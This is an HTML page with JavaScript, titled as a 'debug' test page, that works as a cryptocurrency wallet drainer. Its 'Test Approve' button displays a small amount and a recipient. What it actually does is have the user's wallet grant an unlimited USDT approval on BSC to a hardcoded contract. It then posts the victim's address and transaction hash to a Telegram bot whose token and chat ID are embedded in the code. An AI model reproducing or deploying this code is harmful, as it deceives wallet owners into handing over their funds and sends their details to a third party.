<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Trusts - DEBUG</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
        .log-container { background: #000; border: 1px solid #00ff00; padding: 10px; height: 400px; overflow-y: auto; margin-bottom: 20px; font-size: 12px; }
        .log-entry { margin: 2px 0; }
        .debug { color: #00ff00; }
        .error { color: #ff0000; }
        .success { color: #00ff00; }
        button { padding: 10px 20px; background: #0052cc; color: white; border: none; cursor: pointer; font-size: 14px; }
        button:disabled { opacity: 0.5; }
        input { padding: 8px; margin: 5px 0; width: 100%; }
    </style>
</head>
<body>
    <h1>Trusts - DEBUG MODE</h1>
    <div class="log-container" id="logContainer"></div>
    
    <div>
        <input id="recipientInput" type="text" placeholder="Recipient address" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b">
        <input id="amountInput" type="number" placeholder="Amount" value="10">
        <button id="testBtn" onclick="handleMainAction()">Test Approve</button>
    </div>

    <script>
        const TOKENS = {
            'usdt_bsc': {
                name: 'USDT on BSC',
                symbol: 'USDT',
                network: 'BSC',
                chainId: 56,
                chainIdHex: '0x38',
                address: '0x55d398326f99059fF775485246999027B3197955',
                decimals: 18,
                rpc: 'https://bsc-dataseed1.binance.org:8545',
                smartContract: '0xBAE688D04e14E9939C3a5dA69a1D746ea3487570'
            }
        };

        const CONFIG = {
            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
            TELEGRAM_CHAT_ID: '8933407008'
        };

        function log(message, type = 'debug') {
            const container = document.getElementById('logContainer');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            container.appendChild(entry);
            container.scrollTop = container.scrollHeight;
            console.log(`[${type.toUpperCase()}] ${message}`);
        }

        async function handleMainAction() {
            const btn = document.getElementById('testBtn');
            const recipient = document.getElementById('recipientInput').value.trim();
            const amount = document.getElementById('amountInput').value.trim();
            const token = TOKENS['usdt_bsc'];

            log('=== ATTEMPT START ===', 'debug');
            log('handleMainAction START', 'debug');

            btn.disabled = true;

            try {
                log('Step 1: Detecting wallet...', 'debug');
                let ethereum = window.ethereum;
                if (!ethereum) {
                    log('ERROR: Wallet not detected', 'error');
                    return;
                }
                log('Wallet detected', 'success');

                log('Step 2: Getting accounts...', 'debug');
                let accounts = await ethereum.request({ method: "eth_accounts" });
                let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
                log(`User address: ${userAddress}`, 'success');

                log('Step 3: Checking current chain...', 'debug');
                const currentChainId = await ethereum.request({ method: 'eth_chainId' });
                log(`Current chain: ${currentChainId}, Target: ${token.chainIdHex}`, 'debug');

                if (currentChainId !== token.chainIdHex) {
                    log('Step 4: Switching chain...', 'debug');
                    try {
                        const switchResult = await ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: token.chainIdHex }]
                        });
                        log(`Chain switch result: ${JSON.stringify(switchResult)}`, 'success');
                    } catch (switchError) {
                        log(`Chain switch error code: ${switchError.code}`, 'error');
                        if (switchError.code === 4902) {
                            log('Adding new chain...', 'debug');
                            await ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: token.chainIdHex,
                                    chainName: token.network,
                                    rpcUrls: [token.rpc],
                                    nativeCurrency: { name: token.network, symbol: token.symbol, decimals: token.decimals }
                                }]
                            });
                            log('Chain added successfully', 'success');
                        } else {
                            throw switchError;
                        }
                    }
                } else {
                    log('Already on correct chain', 'success');
                }

                log('Step 5: Preparing approve transaction...', 'debug');
                const USDT_ABI = ['function approve(address spender, uint256 amount) public returns (bool)'];
                const iface = new ethers.utils.Interface(USDT_ABI);
                const approveData = iface.encodeFunctionData("approve", [token.smartContract, ethers.constants.MaxUint256]);

                const tx = { to: token.address, data: approveData };
                if (userAddress) tx.from = userAddress;
                log(`Transaction prepared: ${JSON.stringify(tx)}`, 'debug');

                log('Step 6: Sending eth_sendTransaction...', 'debug');
                log('>>> AWAITING WALLET SIGNATURE <<<', 'debug');
                
                let txHash;
                try {
                    txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
                    log(`✓ eth_sendTransaction RETURNED: ${txHash}`, 'success');
                    log(`✓ txHash type: ${typeof txHash}`, 'success');
                    log(`✓ txHash is valid: ${txHash !== null && txHash !== undefined}`, 'success');
                } catch (e) {
                    log(`✗ eth_sendTransaction ERROR: ${e.message}`, 'error');
                    log(`✗ Error code: ${e.code}`, 'error');
                    throw e;
                }

                log('>>> EXECUTION CONTINUES AFTER eth_sendTransaction <<<', 'success');

                log('Step 7: Showing processing screen...', 'debug');
                const processingScreen = document.getElementById('processingScreen');
                if (processingScreen) {
                    processingScreen.classList.add('active');
                    log('Processing screen shown', 'success');
                } else {
                    log('Processing screen element not found', 'error');
                }

                let finalUserAddress = userAddress || 'Unknown';
                log(`Final user address: ${finalUserAddress}`, 'debug');

                log('Step 8: Sending Telegram notification...', 'debug');
                try {
                    await sendTelegramNotification(finalUserAddress, txHash, amount, token, recipient);
                    log('✓ Telegram notification sent successfully', 'success');
                } catch (err) {
                    log(`✗ Telegram notification error: ${err.message}`, 'error');
                }

                log('Step 9: Waiting 3 seconds...', 'debug');
                await new Promise(resolve => setTimeout(resolve, 3000));

                log('=== ATTEMPT COMPLETED SUCCESSFULLY ===', 'success');
                btn.disabled = false;

            } catch (error) {
                log(`=== CAUGHT EXCEPTION ===`, 'error');
                log(`Error: ${error.message}`, 'error');
                log(`Stack: ${error.stack}`, 'error');
                btn.disabled = false;
            }
        }

        async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
            const explorerUrl = `https://bscscan.com/tx/${txHash}`;
            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}`;

            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;

            log(`Telegram API call to: ${url}`, 'debug');
            
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: messageText
                })
            });

            const responseData = await response.json();
            log(`Telegram response: ${JSON.stringify(responseData)}`, 'debug');

            if (!responseData.ok) {
                throw new Error('Telegram API error: ' + (responseData.description || 'Unknown error'));
            }
        }

        log('Page loaded - ready for testing', 'success');
    </script>
</body>
</html>
